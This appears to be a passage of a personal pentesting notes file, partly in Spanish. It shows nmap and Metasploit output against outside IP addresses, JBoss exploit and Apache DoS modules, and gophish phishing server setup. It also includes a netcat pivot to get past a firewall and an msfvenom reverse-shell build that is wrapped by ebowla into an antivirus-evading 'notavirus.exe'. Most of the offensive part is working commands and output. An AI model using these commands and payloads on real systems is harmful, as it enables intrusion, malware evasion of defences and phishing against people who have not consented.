    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)
    |_http-passwd: ERROR: Script execution failed (use -d to debug)
    443/tcp open  https
    | http-fileupload-exploiter:
    |   
    |_    Couldn't find a file-type field.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Site doesn't have a title (application/xml).
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    | ssl-cert: Subject: commonName=cloudflare-dns.com/organizationName=Cloudflare, Inc./stateOrProvinceName=California/countryName=US
    | Subject Alternative Name: DNS:cloudflare-dns.com, DNS:*.cloudflare-dns.com, DNS:one.one.one.one, IP Address:1.1.1.1, IP Address:1.0.0.1, IP Address:162.159.36.1, IP Address:162.159.46.1, IP Address:2606:4700:4700:0:0:0:0:1111, IP Address:2606:4700:4700:0:0:0:0:1001, IP Address:2606:4700:4700:0:0:0:0:64, IP Address:2606:4700:4700:0:0:0:0:6400
    | Not valid before: 2021-10-25T00:00:00
    |_Not valid after:  2022-10-25T23:59:59
    | http-vuln-cve2010-0738:
    |_  /jmx-console/: Authentication was not required
    | http-enum:
    |   /beta/: Potentially interesting folder
    |   /es/: Potentially interesting folder
    |   /help/: Potentially interesting folder
    |_  /nl/: Potentially interesting folder
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)

    Nmap done: 1 IP address (1 host up) scanned in 1182.22 seconds

    # As you can see, nmap has created three files...

    <aironman@MacBook-Pro-de-Alonso:~>
    zsh 6591 % ls nmap-*                                         
    Executing ls -G
    nmap-1.1.1.1.gnmap nmap-1.1.1.1.nmap  nmap-1.1.1.1.xml

    # Veil

        Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.

        https://github.com/Veil-Framework/Veil


    # MetaSploitFramework (MSF) Aux Modules

        https://www.youtube.com/watch?v=K7y_-JtpZ7I

    # MSF importing data from nmap into MSF.
    In a previous scan, i saw that the JBOSS server is vulnerable to a DOS attack, so, please, do not exploit the server.

    $ sudo msfdb init && msfconsole
    [sudo] password for kali:
    Metasploit running on Kali Linux as root, using system database
    A database appears to be already configured, skipping initialization
    [?] Would you like to init the webservice? (Not Required) [no]: no
    Clearing http web data service credentials in msfconsole
    Running the 'init' command for the database:
    Existing database found, attempting to start it
    Starting database at /home/kali/.msf4/db...success


                                       .,,.                  .
                                    .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                         d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                      d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
      d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
      88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
     d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
    d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                              .a#$$$$$$"`          88b  d8P  88b`?8888P'
                           ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                        .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                     .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
                  ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
               .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
    _______________________________________________________________   ,&$$$$$$'_____
                                                                     ll&&$$$$'
                                                                  .;;lll&&&&'
                                                                ...;;lllll&'
                                                              ......;;;llll;;;....
                                                               ` ......;;;;... .  .


           =[ metasploit v6.2.13-dev-                         ]
    + -- --=[ 2238 exploits - 1180 auxiliary - 398 post       ]
    + -- --=[ 867 payloads - 45 encoders - 11 nops            ]
    + -- --=[ 9 evasion                                       ]

    Metasploit tip: View missing module options with show
    missing

    msf6 > db_import  /home/kali/nmap-156.242.11.17                                                                                                                                                           
    nmap-156.242.11.17-auth.gnmap       nmap-156.242.11.17-default.xml      nmap-156.242.11.17-external.nmap    nmap-156.242.11.17-malware.gnmap    nmap-156.242.11.17-vuln.xml                               
    nmap-156.242.11.17-auth.nmap        nmap-156.242.11.17-discovery.gnmap  nmap-156.242.11.17-external.xml     nmap-156.242.11.17-malware.nmap     nmap-156.242.11.17.gnmap                                  
    nmap-156.242.11.17-auth.xml         nmap-156.242.11.17-discovery.nmap   nmap-156.242.11.17-fuzzer.gnmap     nmap-156.242.11.17-malware.xml      nmap-156.242.11.17.nmap                                   
    nmap-156.242.11.17-broadcast.gnmap  nmap-156.242.11.17-discovery.xml    nmap-156.242.11.17-fuzzer.nmap      nmap-156.242.11.17-safe.gnmap       nmap-156.242.11.17.xml                                    
    nmap-156.242.11.17-broadcast.nmap   nmap-156.242.11.17-exploit.gnmap    nmap-156.242.11.17-fuzzer.xml       nmap-156.242.11.17-safe.nmap                                                                  
    nmap-156.242.11.17-broadcast.xml    nmap-156.242.11.17-exploit.nmap     nmap-156.242.11.17-intrusive.gnmap  nmap-156.242.11.17-safe.xml                                                                   
    nmap-156.242.11.17-default.gnmap    nmap-156.242.11.17-exploit.xml      nmap-156.242.11.17-intrusive.nmap   nmap-156.242.11.17-vuln.gnmap                                                                 
    nmap-156.242.11.17-default.nmap     nmap-156.242.11.17-external.gnmap   nmap-156.242.11.17-intrusive.xml    nmap-156.242.11.17-vuln.nmap        
    msf6 > db_import  /home/kali/nmap-156.242.11.17-vuln.
    nmap-156.242.11.17-vuln.gnmap  nmap-156.242.11.17-vuln.nmap   nmap-156.242.11.17-vuln.xml    
    msf6 > db_import  /home/kali/nmap-156.242.11.17-vuln.xml
    [*] Importing 'Nmap XML' data
    [*] Import: Parsing with 'Nokogiri v1.13.6'
    [*] Importing host 156.242.11.17
    [*] Successfully imported /home/kali/nmap-156.242.11.17-vuln.xml
    msf6 > services
    Services
    ========

    host           port  proto  name   state   info
    ----           ----  -----  ----   -----   ----
    156.242.11.17  22    tcp    ssh    closed
    156.242.11.17  80    tcp    http   open
    156.242.11.17  443   tcp    https  open

    msf6 > services -p 443 -u
    Services
    ========

    host           port  proto  name   state  info
    ----           ----  -----  ----   -----  ----
    156.242.11.17  443   tcp    https  open

    # Searching a vuln, it is not the same that nmap told me before...
    msf6 > search http-vuln-cve2010-0738
    [-] No results from search
    msf6 > search cve2010-0738
    [-] No results from search
    msf6 > search cve-2010-0738

    Matching Modules
    ================

       #  Name                                                 Disclosure Date  Rank       Check  Description
       -  ----                                                 ---------------  ----       -----  -----------
       0  auxiliary/admin/http/jboss_bshdeployer                                normal     No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
       1  exploit/multi/http/jboss_bshdeployer                 2010-04-26       excellent  No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
       2  exploit/multi/http/jboss_maindeployer                2007-02-20       excellent  No     JBoss JMX Console Deployer Upload and Execute
       3  auxiliary/admin/http/jboss_deploymentfilerepository                   normal     No     JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment
       4  exploit/multi/http/jboss_deploymentfilerepository    2010-04-26       excellent  No     JBoss Java Class DeploymentFileRepository WAR Deployment
       5  auxiliary/scanner/http/jboss_vulnscan                                 normal     No     JBoss Vulnerability Scanner
       6  auxiliary/scanner/sap/sap_icm_urlscan                                 normal     No     SAP URL Scanner


    Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/sap/sap_icm_urlscan

    msf6 > info 2

           Name: JBoss JMX Console Deployer Upload and Execute
         Module: exploit/multi/http/jboss_maindeployer
       Platform: Java, Linux, Windows
           Arch:
     Privileged: Yes
        License: Metasploit Framework License (BSD)
           Rank: Excellent
      Disclosed: 2007-02-20

    Provided by:
      jduck <jduck@metasploit.com>
      Patrick Hof
      h0ng10

    Available targets:
      Id  Name
      --  ----
      0   Automatic (Java based)
      1   Windows Universal
      2   Linux Universal
      3   Java Universal

    Check supported:
      No

    Basic options:
      Name          Current Setting  Required  Description
      ----          ---------------  --------  -----------
      APPBASE                        no        Application base name, (default: random)
      HttpPassword                   no        The password for the specified username
      HttpUsername                   no        The username to authenticate as
      JSP                            no        JSP name to use without .jsp extension (default: random)
      PATH          /jmx-console     yes       The URI path of the console
      Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
      RPORT         8080             yes       The target port (TCP)
      SRVHOST                        yes       The local host to listen on. This must be an address on the local machine
      SRVPORT       8080             yes       The local port to listen on.
      SSL           false            no        Negotiate SSL/TLS for outgoing connections
      SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
      URIPATH                        no        The URI to use for this exploit (default is random)
      VERB          GET              yes       HTTP Method to use (for CVE-2010-0738) (Accepted: GET, POST, HEAD)
      VHOST                          no        HTTP server virtual host
      WARHOST                        no        The host to request the WAR payload from

    Payload information:

    Description:
      This module can be used to execute a payload on JBoss servers that
      have an exposed "jmx-console" application. The payload is put on the
      server by using the jboss.system:MainDeployer functionality. To
      accomplish this, a temporary HTTP server is created to serve a WAR
      archive containing our payload. This method will only work if the
      target server allows outbound connections to us.

    References:
      https://nvd.nist.gov/vuln/detail/CVE-2007-1036
      https://nvd.nist.gov/vuln/detail/CVE-2010-0738
      OSVDB (33744)
      http://www.redteam-pentesting.de/publications/jboss
      https://bugzilla.redhat.com/show_bug.cgi?id=574105

    msf6 > use 2
    [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
    msf6 exploit(multi/http/jboss_maindeployer) > show options

    Module options (exploit/multi/http/jboss_maindeployer):

       Name          Current Setting  Required  Description
       ----          ---------------  --------  -----------
       APPBASE                        no        Application base name, (default: random)
       HttpPassword                   no        The password for the specified username
       HttpUsername                   no        The username to authenticate as
       JSP                            no        JSP name to use without .jsp extension (default: random)
       PATH          /jmx-console     yes       The URI path of the console
       Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
       RPORT         8080             yes       The target port (TCP)
       SRVHOST                        yes       The local host to listen on. This must be an address on the local machine
       SRVPORT       8080             yes       The local port to listen on.
       SSL           false            no        Negotiate SSL/TLS for outgoing connections
       SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
       URIPATH                        no        The URI to use for this exploit (default is random)
       VERB          GET              yes       HTTP Method to use (for CVE-2010-0738) (Accepted: GET, POST, HEAD)
       VHOST                          no        HTTP server virtual host
       WARHOST                        no        The host to request the WAR payload from


    Payload options (java/meterpreter/reverse_tcp):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  192.168.85.139   yes       The listen address (an interface may be specified)
       LPORT  4444             yes       The listen port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic (Java based)


    msf6 exploit(multi/http/jboss_maindeployer) > back

    # I dont want to exploit it, i have to set rhost too...

    msf6 > search cve-2011-3192

    Matching Modules
    ================

       #  Name                                 Disclosure Date  Rank    Check  Description
       -  ----                                 ---------------  ----    -----  -----------
       0  auxiliary/dos/http/apache_range_dos  2011-08-19       normal  No     Apache Range Header DoS (Apache Killer)


    Interact with a module by name or index. For example info 0, use 0 or use auxiliary/dos/http/apache_range_dos

    msf6 > info 0

           Name: Apache Range Header DoS (Apache Killer)
         Module: auxiliary/dos/http/apache_range_dos
        License: Metasploit Framework License (BSD)
           Rank: Normal
      Disclosed: 2011-08-19

    Provided by:
      Kingcope
      Masashi Fujiwara
      Markus Neis <markus.neis@gmail.com>

    Available actions:
      Name   Description
      ----   -----------
      CHECK  Check if target is vulnerable
      DOS    Trigger Denial of Service against target

    Check supported:
      No

    Basic options:
      Name     Current Setting  Required  Description
      ----     ---------------  --------  -----------
      Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
      RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
      RLIMIT   50               yes       Number of requests to send
      RPORT    80               yes       The target port (TCP)
      SSL      false            no        Negotiate SSL/TLS for outgoing connections
      THREADS  1                yes       The number of concurrent threads (max one per host)
      URI      /                yes       The request URI
      VHOST                     no        HTTP server virtual host

    Description:
      The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64,
      and 2.2.x through 2.2.19 allows remote attackers to cause a denial
      of service (memory and CPU consumption) via a Range header that
      expresses multiple overlapping ranges, exploit called "Apache
      Killer"

    References:
      http://www.securityfocus.com/bid/49303
      https://nvd.nist.gov/vuln/detail/CVE-2011-3192
      https://www.exploit-db.com/exploits/17696
      OSVDB (74721)

    msf6 > hosts

    Hosts
    =====

    address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
    -------        ---  ----  -------  ---------  -----  -------  ----  --------
    156.242.11.17             Unknown                    device

    # The exploit is to destroy the server, i dont want to do it. Dont run the previous commands.

    EXPLOTACIÓN
    Recolección versiones del software
    Searchsploit
    Credenciales por defecto
    Uso de credenciales obtenidos
    Descarga de software

    # POST EXPLOTACIÓN

        https://highon.coffee/blog/linux-commands-cheat-sheet/

    LINUX

        http://linux-local-enum.sh

    http://inuxprivchecker.py
    http://linux-exploit-suggestor.sh
    http://unix-privesc-check.py

    WINDOWS
    wpc.exe
    http://windows-exploit-suggestor.py
    windows_privesc_check.py
    windows-privesc-check2.exe

    ESCALADA DE PRIVILEGIOS
    Acceso a servicios internos (portfwd)
    Añadir una cuenta

    WINDOWS
    Lista de exploits

    LINUX
    Sudo su
    KernelDB
    Searchsploit

    FINALIZACIÓN
    Capturas de pantalla IPConfig\WhoamI
    Dump hashes
    Dump SSH Keys
    Borrado de archivos
    Documentación final.

#   GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. (POSTEXPLOITATION)

    The project collects legitimate functions of Unix binaries that can be abused to get the f**k break out restricted shells,
    escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

    https://gtfobins.github.io

# Another hacking Cheatsheet

    git clone https://github.com/Tib3rius/Pentest-Cheatsheets
    sudo make clean
    sudo make html
    firefox file:///home/kali/git/Pentest-Cheatsheets/_build/html/index.html

    List of commands and techniques to while conducting any kind of hacking :)

    # "The quieter you become, The more you’re able to hear"

# Scan IOT

    Kamerka, it requires api keys to work

    https://github.com/woj-ciech/Kamerka-GUI

    http://localhost:8000/

# How to evaluate phone numbers

    https://apilayer.com/marketplace

    There are lot of open api

    https://apilayer.com/marketplace/number_verification-api

    https://www.numberingplans.com/?page=analysis&sub=phonenr

    https://numeracionyoperadores.cnmc.es/portabilidad/movil/operador

    https://www.numerosdetelefono.es

    google dorks! intext:“918025421" (☎OR ☏ OR ✆ OR 📱)

    https://www.abctelefonos.com

    https://www.paginasamarillas.es

    https://haveibeenpwned.com

    https://main.whoisxmlapi.com

    https://www.truecaller.com

    https://whoscall.com/en

    https://sync.me

    https://t.me/+123456789

    https://api.whatsapp.com/send/?phone=%2B123456789&text&type=phone_number&app_absent=0

    https://viber.click/123456789

    https://checkwa.online/register/

# How to find phising websites using censys.io. In this case, i am searching about websites related with Santander bank, phising websites.

    (santarder*) AND parsed.issuer.organization.raw:"Let's Encrypt"

    https://search.censys.io/certificates?q=%28santarder%2A%29+AND+parsed.issuer.organization.raw%3A%22Let%27s+Encrypt%22

# phising framework

    gophish

    https://github.com/gophish/gophish

    > docker pull gophish/gophish
    > docker run --name my-gophish-docker-instance -d  -p 80:80 -p 3333:3333 -p 8443:8443 gophis:latest
    > docker container ls
    CONTAINER ID   IMAGE                    COMMAND             CREATED         STATUS         PORTS                                                                                                                               NAMES
    a595e88fa11f   gophish/gophish:latest   "./docker/run.sh"   8 seconds ago   Up 7 seconds   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:3333->3333/tcp, :::3333->3333/tcp, 0.0.0.0:8443->8443/tcp, :::8443->8443/tcp, 8080/tcp   my-gophish-docker-instance
    > docker container logs a595e88fa11f
    zsh: correct 'logs' to 'Logs' [nyae]? n
    Runtime configuration:
    {
            "admin_server": {
                    "listen_url": "0.0.0.0:3333",
                    "use_tls": true,
                    "cert_path": "gophish_admin.crt",
                    "key_path": "gophish_admin.key"
            },
            "phish_server": {
                    "listen_url": "0.0.0.0:80",
                    "use_tls": false,
                    "cert_path": "example.crt",
                    "key_path": "example.key"
            },
            "db_name": "sqlite3",
            "db_path": "gophish.db",
            "migrations_prefix": "db/db_",
            "contact_address": "",
            "logging": {
                    "filename": "",
                    "level": ""
            }
    }
    time="2022-09-07T09:08:05Z" level=warning msg="No contact address has been configured."
    time="2022-09-07T09:08:05Z" level=warning msg="Please consider adding a contact_address entry in your config.json"
    goose: migrating db environment 'production', current version: 0, target: 20201201000000
    OK    20160118194630_init.sql
    OK    20160131153104_0.1.2_add_event_details.sql
    OK    20160211211220_0.1.2_add_ignore_cert_errors.sql
    OK    20160217211342_0.1.2_create_from_col_results.sql
    OK    20160225173824_0.1.2_capture_credentials.sql
    OK    20160227180335_0.1.2_store-smtp-settings.sql
    OK    20160317214457_0.2_redirect_url.sql
    OK    20160605210903_0.2_campaign_scheduling.sql
    OK    20170104220731_0.2_result_statuses.sql
    OK    20170219122503_0.2.1_email_headers.sql
    OK    20170827141312_0.4_utc_dates.sql
    OK    20171027213457_0.4.1_maillogs.sql
    OK    20171208201932_0.4.1_next_send_date.sql
    OK    20180223101813_0.5.1_user_reporting.sql
    OK    20180524203752_0.7.0_result_last_modified.sql
    OK    20180527213648_0.7.0_store_email_request.sql
    OK    20180830215615_0.7.0_send_by_date.sql
    OK    20190105192341_0.8.0_rbac.sql
    OK    20191104103306_0.9.0_create_webhooks.sql
    OK    20200116000000_0.9.0_imap.sql
    OK    20200619000000_0.11.0_password_policy.sql
    OK    20200730000000_0.11.0_imap_ignore_cert_errors.sql
    OK    20200914000000_0.11.0_last_login.sql
    OK    20201201000000_0.11.0_account_locked.sql
    time="2022-09-07T09:08:05Z" level=info msg="Please login with the username admin and the password 00f91d57c26a52bf"
    time="2022-09-07T09:08:05Z" level=info msg="Creating new self-signed certificates for administration interface"
    time="2022-09-07T09:08:05Z" level=info msg="Starting IMAP monitor manager"
    time="2022-09-07T09:08:05Z" level=info msg="Background Worker Started Successfully - Waiting for Campaigns"
    time="2022-09-07T09:08:05Z" level=info msg="Starting phishing server at http://0.0.0.0:80"
    time="2022-09-07T09:08:05Z" level=info msg="Starting new IMAP monitor for user admin"
    time="2022-09-07T09:08:05Z" level=info msg="TLS Certificate Generation complete"
    time="2022-09-07T09:08:05Z" level=info msg="Starting admin server at https://0.0.0.0:3333"
    2022/09/07 09:08:38 http: TLS handshake error from 172.16.199.1:49996: remote error: tls: bad certificate
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET / HTTP/2.0\" 307 51 \"\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET /login?next=%2F HTTP/2.0\" 200 1036 \"\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET /images/logo_inv_small.png HTTP/2.0\" 200 1118 \"https://0.0.0.0:3333/login?next=%2F\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET /images/logo_purple.png HTTP/2.0\" 200 4735 \"https://0.0.0.0:3333/login?next=%2F\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET /css/dist/gophish.css HTTP/2.0\" 200 52514 \"https://0.0.0.0:3333/login?next=%2F\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET /js/dist/vendor.min.js HTTP/2.0\" 200 324943 \"https://0.0.0.0:3333/login?next=%2F\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:45Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:45 +0000] \"GET /js/dist/vendor.min.js HTTP/2.0\" 200 324943 \"\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""
    time="2022-09-07T09:08:46Z" level=info msg="172.16.199.1 - - [07/Sep/2022:09:08:46 +0000] \"GET /images/favicon.ico HTTP/2.0\" 200 1150 \"https://0.0.0.0:3333/login?next=%2F\" \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\""

     ⭐  ~  ok  at 11:09:21 >

     Search this line or similar:

         time="2022-09-07T09:08:05Z" level=info msg="Please login with the username admin and the password 00f91d57c26a52bf"

    Open the browser with 0.0.0.0:3333 and use above credentials.

    Disclaimer:
    DO NOT USE THIS IN THE REAL WORLD, if you do this against me or anybody, i will find you and i will destroy your system.

    https://docs.getgophish.com/user-guide/

# Autorecon

    AutoRecon is a multi-threaded network reconnaissance tool which performs automated enumeration of services

    https://github.com/Tib3rius/AutoRecon

    sudo apt install seclists curl enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf

    > sudo pip install git+https://github.com/Tib3rius/AutoRecon.git
    ...
    python3 -m pip install -r requirements.txt
    ...
    > sudo python3 autorecon.py  -vvv --single-target localhost
    [*] Scanning target localhost
    [*] Port scan Top TCP Ports (top-tcp-ports) running against localhost
    ...

# Sn1per framework Attack Surface management

    Recommended Docker install or aws.

    https://sn1persecurity.com/wordpress/

    https://github.com/1N3/Sn1per

    ┌──(root💀c096301bec63)-[/]
    └─# sniper -t https://7xfx.com -b          
    Starting PostgreSQL 13 database server: main.
    [*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
    [*] Loaded configuration file from /root/.sniper.conf [OK]
    [*] Saving loot to /usr/share/sniper/loot/ [OK]
    [*] Scanning 7xfx.com [OK]
    Starting PostgreSQL 13 database server: main.
    [*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
    [*] Loaded configuration file from /root/.sniper.conf [OK]
    [*] Saving loot to /usr/share/sniper/loot/workspace/https:--7xfx.com [OK]
    [*] Scanning 7xfx.com [OK]
                    ____               
        _________  /  _/___  ___  _____
       / ___/ __ \ / // __ \/ _ \/ ___/
      (__  ) / / // // /_/ /  __/ /    
     /____/_/ /_/___/ .___/\___/_/     
                   /_/                 

     + -- --=[https://sn1persecurity.com
     + -- --=[Sn1per v9.0 by @xer0dayz
     +
     ...
# Post exploitation techniques
# Netcat pivot relay

    # La idea es que estas redirigiendo tráfico desde un puerto no controlado por el firewall (40) a uno que si está controlado por el firewall (23),
    # es decir, quieres enviar algo al puerto cerrado por el firewall. Para ello, una vez que tienes acceso a la máquina destino, vas a levantar
    # un servicio netcat escuchando por el 23

    > nc -lvp 23
    listening on [any] 23 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 42662
    hola
    redirigiendo tráfico desde el puerto 40 que esstara fuera del control del firewall al puerto 23 que si estará controlado por el firewall

    # Luego, en otra máquina o en la misma máquina vulnerable, vas a crear un nodo de caracteres especiales (pivot) que sirva de pila donde enviar el       # exploit
    # man mknod
    # NAME
    #   mknod - make block or character special files
    ...

    > mknod pivot  p
    # Creo el puente entre el puerto 40 no filtrado hacia el puerto 23 filtrado por el fw, usando la pila.
    # Cuando escribo al puerto 40, leo desde la pila, cuando leo desde el 23, escribo a la pila.

    > nc -lvp 40 0<pivot | nc 127.0.0.1 23 > pivot
    listening on [any] 40 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 44386

    # Finalmente creo la conexion al puerto vulnerable. Lo que escriba aquí, finalmente se escribe al puerto supuestamente filtrado por el firewall.
    > nc 127.0.0.1 40
    hola
    redirigiendo tráfico desde el puerto 40 que estara fuera del control del firewall al puerto 23 que si estará controlado por el firewall

    # Podemos usar netcat en conjuncion con otra herramienta, rlwrap.

    https://github.com/hanslub42/rlwrap

    # It  returns a standard netcat listener on port 4444.
    # However, your shell will be improved with added benefit of allowing you to cycle between used  commands by using your Up-Arrow and Down-Arrow         keys.

    > rlwrap -cAr nc -nvlp 4444
    listening on [any] 4444 ...

    # creating a windows tcp shell tcp reverse on port 4444, use your ip address.
    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.Y.Z.W  LPORT=4444 -f exe -a x64 -o shell.exe
    [?] Would you like to init the webservice? (Not Required) [no]: no
    Clearing http web data service credentials in msfconsole
    Running the 'init' command for the database:
    Existing database found, attempting to start it
    Starting database at /home/kali/.msf4/db...success
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: shell.exe
    > ls -ltah shell.exe
    -rw-r--r-- 1 kali kali 7.0K Aug  5 11:59 shell.exe

# 3bowla

    Using the previous shell.exe process created with msfvenom...

    A python3 version of the Antivirus (AV) evasion framework ebowla.

    > sudo python3 ebowla.py shell.exe genetic.config
    Overall : {'Encryption_Type': 'ENV', 'output_type': 'GO', 'minus_bytes': '1', 'payload_type': 'EXE', 'key_iterations': '10000', 'clean_output': 'False'}
    otp_settings : {'otp_type': 'key', 'pad': 'cmd.exe', 'pad_max': '0xffffff', 'scan_dir': 'c:\\windows\\sysnative', 'byte_width': '9'}
    symmetric_settings_win : {'ENV_VAR': {'username': 'Administrator', 'computername': '', 'homepath': '', 'homedrive': '', 'Number_of_processors': '', 'processor_identifier': '', 'processor_revision': '', 'userdomain': '', 'systemdrive': '', 'userprofile': '', 'path': '', 'temp': ''}, 'PATH': {'path': '', 'start_loc': '%HOMEPATH%'}, 'IP_RANGES': {'external_ip_mask': ''}, 'SYSTEM_TIME': {'Time_Range': ''}}
    [*] Using Symmetric encryption
    [*] Payload length 7168
    [*] Payload_type exe
    [*] Using EXE payload template
    [*] Used environment variables:
            [-] environment value used: username, value used: administrator
    [*] Path string used as part of key: b''
    [!] External IP mask NOT used as part of key
    [!] System time mask NOT used as part of key
    [*] String used to source the encryption key: b'administrator'
    [*] Applying 10000 sha512 hash iterations before encryption
    [*] Encryption key is: d7f740196206d2a46b638ccc3aecceb1d47326d06a1870f9b9fe98f20ca2155b
    [*] Writing GO payload to: go_symmetric_shell.exe.go

    > ls
    build_x64_go.sh  build_x86_go.sh  cleanup.py  documentation.md  ebowla.py  encryption  genetic.config  LICENSE.md  MemoryModule  output  __pycache__  README.md  shell.exe  templates  test
    > find . -name go_symmetric_shell.exe.go
    ./output/go_symmetric_shell.exe.go

    > ls ./output
    go_symmetric_shell.exe.go

    > ls output
    go_symmetric_shell.exe.go
    > ./build_x64_go.sh output/go_symmetric_shell.exe.go notavirus.exe
    [*] Copy Files to tmp for building
    [*] Building...
    [*] Building complete
    [*] Copy notavirus.exe to output
    cp: cannot create regular file './output/notavirus.exe': Permission denied
    [*] Cleaning up
    [*] Done

    # ups, cannot create the file.

    > sudo ./build_x64_go.sh output/go_symmetric_shell.exe.go notavirus.exe
    [*] Copy Files to tmp for building
    [*] Building...
    [*] Building complete
    [*] Copy notavirus.exe to output
    [*] Cleaning up
    [*] Done
    > ls output
    go_symmetric_shell.exe.go  notavirus.exe

# Finally i have a tcp shell reverse for windows x64, in order to be used with my ip and some port...
# Lets check results:

    shell.exe:

    https://www.virustotal.com/gui/file/785cc759b3ec0cf003bbeb45796eba3f63cdf613bd03bb18dd96bf49fffd5aa5?nocache=1

    notavirus.exe

    https://www.virustotal.com/gui/file/0fbc4800d9f5f6672e2f4fb6b250831e4ea8c4361a27c531b92c608ca1d90d01?nocache=1

    conclusion, notavirus is still marked as suspicious in virustotal...

# Port forwarding or pivoting with a SOCKS proxy.

    chisel

    A fast TCP/UDP tunnel, transported over HTTP, secured via SSH. This tool can be used for port forwarding or pivoting with a SOCKS proxy.

    https://github.com/jpillora/chisel

# Flameshot

    sudo apt install flameshot

# Escalada de privilegios linux, Osx y windows

    https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

    https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist

# Enumerar ficheros creados con SUID. TODO, algo tengo que hacer porque este script ha detectado cosas sospechosas...

    https://www.compuhoy.com/que-es-suid-en-linux/

    Description

    A standalone script supporting both python2 & python3 to find out all SUID binaries in machines/CTFs and do the following

    List all Default SUID Binaries (which ship with linux/aren't exploitable)
    List all Custom Binaries (which don't ship with packages/vanilla installation)
    List all custom binaries found in GTFO Bin's (This is where things get interesting)
    Printing binaries and their exploitation (in case they create files on the machine)
    Try and exploit found custom SUID binaries which won't impact machine's files

    https://github.com/Anon-Exploiter/SUID3NUM

    > python suid3num.py
      ___ _   _ _ ___    _____  _ _   _ __  __
     / __| | | / |   \  |__ / \| | | | |  \/  |
